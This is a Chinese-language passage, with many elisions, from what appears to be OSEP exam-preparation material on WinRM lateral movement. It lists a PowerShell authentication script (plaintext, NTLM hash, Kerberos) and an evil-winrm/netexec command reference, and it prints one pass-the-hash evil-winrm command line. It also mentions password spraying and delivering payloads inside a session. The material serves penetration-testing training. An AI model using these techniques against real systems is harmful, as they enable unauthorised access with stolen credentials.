...
> 覆盖场景：56
> cheat sheet 依据：`WinRM Access`、`Having an Evil-WinRM session`、`WinRM password spraying`、`Multiple targets with WinRM`（`reference/osep-cheatsheet.md` §8102 / §7849 / §6270 / §6291） | 教材依据：C5（proxy01）
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/powershell/m15-winrm-auth-matrix.ps1` | 明文/哈希/Kerberos 三模板 + 失败排查清单（PowerShell Remoting 线） | `-Target`、`-User`、`-Pass`/`-NtHash`、`-Domain` |
| `scripts/infra/m15-winrm-lateral.md` | evil-winrm / netexec 命令速查 + 会话内 payload 投放备忘 | — |


#### 源码 `scripts/powershell/m15-winrm-auth-matrix.ps1` {#scripts-powershell-m15-winrm-auth-matrix-ps1}

````powershell
<#
# 用途：WinRM 横移的 PowerShell Remoting 认证三模板（明文 / NTLM 哈希 / Kerberos）
#       一次调用完成：端口预检 -> 建 PSSession -> 单发命令或进交互会话；失败时输出排查方向。
# 场景：56（SMB 不通仅 WinRM 开放；Windows 跳板线，Linux 线见 scripts/infra/m15-winrm-lateral.md）
...
elseif ($NtHash) {
    ...
    if ($Mimikatz -and (Test-Path $Mimikatz)) {
        ...
        Write-Host "    1) Linux 线（推荐）：evil-winrm -i $Target -u $User -H $NtHash （见 scripts/infra/m15-winrm-lateral.md）"
...
#### 源码 `scripts/infra/m15-winrm-lateral.md` {#scripts-infra-m15-winrm-lateral-md}

````markdown
# m15 · WinRM 横移命令速查（Kali / evil-winrm / netexec 线）

> 场景 56：凭据有效、SMB 不通、仅 5985/5986 开放。本文是 Linux 攻击机一侧的速查；
> Windows 跳板一侧的模板见 `scripts/powershell/m15-winrm-auth-matrix.ps1`。
...
| 文件 | 说明 |
|---|---|
| `scripts/powershell/m15-winrm-auth-matrix.ps1` | 从 Windows 侧 PowerShell Remoting 的明文/哈希/Kerberos 认证三模板与失败排查 |
| `scripts/infra/m15-winrm-lateral.md` | Kali（evil-winrm/netexec）命令速查 + 会话内 payload 投放备忘 |
